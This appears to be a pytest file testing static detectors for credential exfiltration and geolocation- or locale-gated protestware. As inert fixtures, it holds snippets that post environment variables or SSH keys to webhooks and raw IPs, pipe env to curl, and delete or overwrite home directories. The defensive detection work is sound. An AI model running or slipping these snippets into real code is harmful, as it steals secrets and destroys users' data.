"""credential_exfiltration and protestware_destructive: positive and benign cases, parsing robustness.
All code below is INERT TEXT handed to the static analysers; it is never executed. Addresses use documentation
ranges (198.51.100.0/24) and example hosts."""
import ast
import inspect
import time

import pytest

from detectors import credential_exfiltration as CE, protestware_destructive as PD, run_detectors
from detectors.context import DetectorContext
from security import apply_gate


def ctx(files: dict[str, str], **kw):
    scan = {"ran": True, "malware_proof": {"findings": [], "layers": {}}, "findings": []}
    return DetectorContext.build(scan=scan, data={"text": files}, **kw)


def run(det, files, **kw):
    return det.detect(ctx(files, **kw))


def tiers(r):
    return [f["tier"] for f in r["findings"]]


# ================================================================== credential_exfiltration: positives

def test_bulk_environment_to_webhook_is_high_risk_with_full_evidence():
    code = ("import os, requests\n"
            "data = dict(os.environ)\n"
            "payload = {'env': data}\n"
            "requests.post('https://discord.com/api/webhooks/123/abc', json=payload)\n")
    r = run(CE, {"pkg/stats.py": code})
    assert tiers(r) == ["high_risk"]
    f = r["findings"][0]
    roles = {e.get("role"): e for e in f["evidence"] if e["type"] == "file_line"}
    assert roles["source"]["line"] == 2 and roles["sink"]["line"] == 4
    dest = next(e for e in f["evidence"] if e["type"] == "destination")
    assert dest["class"] == "exfil endpoint" and "discord.com" in dest["host"]
    chain = next(e for e in f["evidence"] if e["type"] == "chain")["steps"]
    assert chain[0].startswith("data") and chain[-1].startswith("payload")
    assert f["capability_evidence"] is True and f["confidence"] == "data-flow"


def test_ssh_key_read_sent_to_raw_ip_is_high_risk():
    code = ("import os, requests\n"
            "def run():\n"
            "    p = os.path.expanduser('~/.ssh/id_rsa')\n"
            "    with open(p) as fh:\n"
            "        key = fh.read()\n"
            "    requests.post('http://198.51.100.7/k', data=key)\n")
    r = run(CE, {"pkg/x.py": code})
    assert tiers(r) == ["high_risk"] and "raw IP" in r["findings"][0]["rule"]


def test_module_level_variable_chain_to_unrelated_host_is_high_risk():
    code = ("import os\nimport requests as r\n"
            "SNAP = {k: v for k, v in os.environ.items()}\n"
            "URL = 'https://collector.example.net/up'\n"
            "def flush():\n"
            "    r.post(URL, json=SNAP)\n")
    res = run(CE, {"pkg/telemetry.py": code})
    assert tiers(res) == ["high_risk"] and "unrelated host" in res["findings"][0]["rule"]


def test_bulk_environment_to_dynamic_destination_is_review():
    code = "import os, requests\ndef send(url):\n    requests.post(url, json=os.environ.copy())\n"
    assert tiers(run(CE, {"pkg/y.py": code})) == ["review"]


def test_named_secret_to_webhook_is_review_not_high_risk():
    code = "import os, requests\ntok = os.environ['GITHUB_TOKEN']\nrequests.post('https://webhook.site/abc', data=tok)\n"
    r = run(CE, {"pkg/z.py": code})
    assert tiers(r) == ["review"] and "Named credential" in r["findings"][0]["rule"]


def test_foreign_secret_store_read_without_sink_is_review():
    code = "import pathlib\nkeys = pathlib.Path.home().joinpath('.ssh').glob('id_*')\nprint(len(list(keys)))\n"
    code2 = "def backup():\n    data = open('/home/u/.ssh/id_ed25519').read()\n    return data\n"
    r = run(CE, {"pkg/a.py": code2})
    assert tiers(r) == ["review"] and "no network sink" in r["findings"][0]["rule"]


def test_js_and_shell_pattern_matches_are_review_at_most():
    js = ("const https = require('https');\n"
          "const body = JSON.stringify(process.env);\n"
          "https.request({host: 'discord.com', path: '/api/webhooks/1/x'}).end(body);\n")
    sh = "#!/bin/sh\nenv | curl -X POST --data-binary @- https://198.51.100.9/c\n"
    r = run(CE, {"lib/index.js": js, "scripts/post.sh": sh})
    assert sorted(tiers(r)) == ["review", "review"]
    assert all(f["confidence"] == "pattern match, no data-flow" and not f["strong"] for f in r["findings"])


# ================================================================== credential_exfiltration: benign

BENIGN_CRED = {
    "boto-style client": ("import os, requests\n"
                          "def sign(k):\n    return 'AWS4-HMAC-SHA256 ' + k[:4]\n"
                          "key = os.environ['AWS_SECRET_ACCESS_KEY']\n"
                          "requests.post('https://sts.amazonaws.com/', headers={'Authorization': sign(key)})\n"),
    "credentials file for its own API": ("import configparser, requests\n"
                                         "cfg = configparser.ConfigParser(); cfg.read('~/.aws/credentials')\n"
                                         "requests.get('https://s3.amazonaws.com/bucket', auth=(cfg['default']['id'], 'x'))\n"),
    "twine-style upload": ("import os, requests\n"
                           "pw = os.environ.get('TWINE_PASSWORD')\n"
                           "requests.post('https://upload.pypi.org/legacy/', auth=('__token__', pw))\n"),
    "env read only logged": ("import os, logging\n"
                             "logging.info('token set: %s', bool(os.environ.get('API_TOKEN')))\n"
                             "print(dict(os.environ))\n"),
    "proxy env read": ("import os, requests\n"
                       "proxies = {'https': os.environ.get('HTTPS_PROXY'), 'http': os.getenv('HTTP_PROXY')}\n"
                       "requests.get('https://example.org/data', proxies=proxies)\n"),
    "env passed to a subprocess": ("import os, subprocess\n"
                                   "subprocess.run(['make'], env=dict(os.environ, CC='gcc'))\n"),
    "git credential helper": ("import subprocess, requests\n"
                              "tok = subprocess.check_output(['git', 'credential', 'fill'], input=b'host=github.com')\n"
                              "requests.get('https://api.github.com/user', headers={'Authorization': 'token ' + tok.decode()})\n"),
}


@pytest.mark.parametrize("label", list(BENIGN_CRED))
def test_benign_credential_use_is_not_flagged(label):
    assert run(CE, {"pkg/client.py": BENIGN_CRED[label]})["findings"] == [], label


def test_named_token_to_the_packages_own_host_is_not_flagged():
    code = "import os, requests\nt = os.environ['ACMECLOUD_TOKEN']\nrequests.post('https://api.acmecloud.io/v1/x', headers={'X-Token': t})\n"
    sec = {"level": "No unpatched issues found", "findings": [], "package": {"ecosystem": "PyPI", "name": "acmecloud"}}
    assert run(CE, {"acmecloud/api.py": code}, security=sec)["findings"] == []


# ================================================================== protestware_destructive: positives

def test_geolocation_gated_delete_is_high_risk():
    code = ("import requests, shutil, os\n"
            "def check():\n"
            "    info = requests.get('https://ipinfo.io/json').json()\n"
            "    if info.get('country') in ('RU', 'BY'):\n"
            "        shutil.rmtree(os.path.expanduser('~'))\n")
    r = run(PD, {"pkg/check.py": code})
    assert tiers(r) == ["high_risk"]
    ev = {e["role"]: e for e in r["findings"][0]["evidence"]}
    assert ev["gate"]["line"] == 4 and ev["destructive"]["line"] == 5 and r["findings"][0]["capability_evidence"]


def test_locale_guard_clause_then_mass_overwrite_is_high_risk():
    code = ("import locale, os\n"
            "def run(home):\n"
            "    lang = locale.getdefaultlocale()[0] or ''\n"
            "    if not lang.startswith('ru'):\n"
            "        return\n"
            "    for root, dirs, files in os.walk(home):\n"
            "        for name in files:\n"
            "            open(os.path.join(root, name), 'w').write('peace')\n")
    r = run(PD, {"pkg/peace.py": code})
    assert tiers(r) == ["high_risk"] and "overwrite" in r["findings"][0]["detail"]


def test_fixed_date_gate_is_high_risk():
    code = ("import os\nfrom datetime import datetime\n"
            "today = datetime.now()\n"
            "if today > datetime(2022, 3, 8):\n"
            "    os.remove('/tmp/data.db')\n")
    assert tiers(run(PD, {"pkg/d.py": code})) == ["high_risk"]


def test_timezone_and_hostname_gates_are_high_risk():
    tz = "import time, os\nif time.tzname[0] == 'MSK':\n    os.kill(1, 9)\n"
    host = "import socket, subprocess\nif socket.gethostname().endswith('.corp.example'):\n    subprocess.call('rm -rf /srv/data', shell=True)\n"
    assert tiers(run(PD, {"a.py": tz})) == ["high_risk"]
    assert tiers(run(PD, {"b.py": host})) == ["high_risk"]


def test_js_node_ipc_style_is_review_only():
    js = ("const fs = require('fs');\n"
          "fetch('https://api.ipgeolocation.io/ipgeo').then(r => r.json()).then(d => {\n"
          "  if (d.country_name === 'Russia' || d.countryCode === 'RU') { fs.writeFileSync('/home/x', '<3'); }\n"
          "});\n")
    r = run(PD, {"lib/ssl-geospec.js": js})
    assert tiers(r) == ["review"] and r["findings"][0]["confidence"] == "pattern match, no data-flow"


# ================================================================== protestware_destructive: benign

BENIGN_DESTRUCTIVE = {
    "cleanup of a temp dir": ("import shutil, tempfile\n"
                              "def build():\n    tmp = tempfile.mkdtemp()\n    try:\n        pass\n    finally:\n        shutil.rmtree(tmp)\n"),
    "platform-gated cleanup": ("import sys, os, shutil, platform\n"
                               "if sys.platform == 'win32':\n    shutil.rmtree('build')\n"
                               "elif os.name == 'nt':\n    os.remove('a.lock')\n"
                               "if platform.system() == 'Darwin':\n    os.remove('.DS_Store')\n"),
    "cache expiry by age": ("import os, time\n"
                            "for f in os.listdir('cache'):\n    if time.time() - os.path.getmtime(f) > 3600:\n        os.remove(f)\n"),
    "locale only logged": ("import locale, logging, shutil\n"
                           "logging.info('locale %s', locale.getlocale())\nshutil.rmtree('dist')\n"),
    "ungated server loop": "def serve(sock):\n    while True:\n        handle(sock.accept())\n",
    "locale-aware formatting": ("import locale\nif locale.getlocale()[0] == 'de_DE':\n    SEP = ','\nelse:\n    SEP = '.'\n"),
}


@pytest.mark.parametrize("label", list(BENIGN_DESTRUCTIVE))
def test_benign_destructive_or_gate_alone_is_not_flagged(label):
    assert run(PD, {"pkg/m.py": BENIGN_DESTRUCTIVE[label]})["findings"] == [], label


# ================================================================== parsing robustness

def test_hostile_files_do_not_crash_or_stall_and_other_files_are_still_analysed():
    from detectors import pyast
    deep = "x = " + "(" * 50_000 + "1" + ")" * 50_000 + "\n"
    chain = "x = 1" + " + 1" * 300_000 + "\n"          # over the size cap: skipped before parsing
    recursion = "x = 1" + " + 1" * 90_000 + "\n"        # under the cap: ast.parse raises RecursionError, caught
    huge = "a = 1\n" * (pyast.MAX_PARSE_BYTES // 6 + 10)
    bad = "def (:\n"
    evil = ("import os, requests\nrequests.post('https://webhook.site/x', json=dict(os.environ))\n")
    files = {"pkg/deep.py": deep, "pkg/chain.py": chain, "pkg/recursion.py": recursion, "pkg/huge.py": huge,
             "pkg/bad.py": bad, "pkg/evil.py": evil}
    assert pyast.safe_parse(recursion)[1] == "unparseable (RecursionError)"
    t0 = time.time()
    r = run(CE, files)
    p = run(PD, files)
    assert time.time() - t0 < 20
    assert r["status"] == p["status"] == "ran"
    assert tiers(r) == ["high_risk"]                       # the normal file is still analysed
    assert r["coverage"] == "partial" and "not analysed" in r["coverage_detail"]


def test_detector_code_never_compiles_or_executes_repository_content():
    for mod in ("detectors.pyast", "detectors.credential_exfiltration", "detectors.protestware_destructive"):
        src = inspect.getsource(__import__(mod, fromlist=["x"]))
        tree = ast.parse(src)
        builtins = {n.func.id for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Name)}
        dynamic_import = {n.func.attr for n in ast.walk(tree) if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                          and n.func.attr == "import_module"}
        assert not builtins & {"exec", "eval", "compile", "__import__"} and not dynamic_import, mod


# ================================================================== wiring

def test_apply_gate_reuses_data_detector_results_from_the_scan():
    evil = "import os, requests\nrequests.post('https://webhook.site/x', json=dict(os.environ))\n"
    c = ctx({"pkg/evil.py": evil})
    pre = run_detectors(c)
    scan = {"ran": True, "malware_proof": {"findings": [], "layers": {}}, "findings": [], "detectors": pre,
            "known_malicious_count": 0, "high_risk_pattern_count": 0, "strong": 0}
    g = apply_gate({"score": 90.0, "label": "Healthy", "factors": [], "notes": []},
                   {"level": "No unpatched issues found", "findings": [], "coverage": [], "package": None}, [], scan)
    d = next(x for x in g["detectors"] if x["detector"] == "credential_exfiltration")
    assert d["status"] == "ran" and d["tier"] == "high_risk"
    assert g["trust_score"] <= 49 and g["limiting_pillar"] == "Behavior"
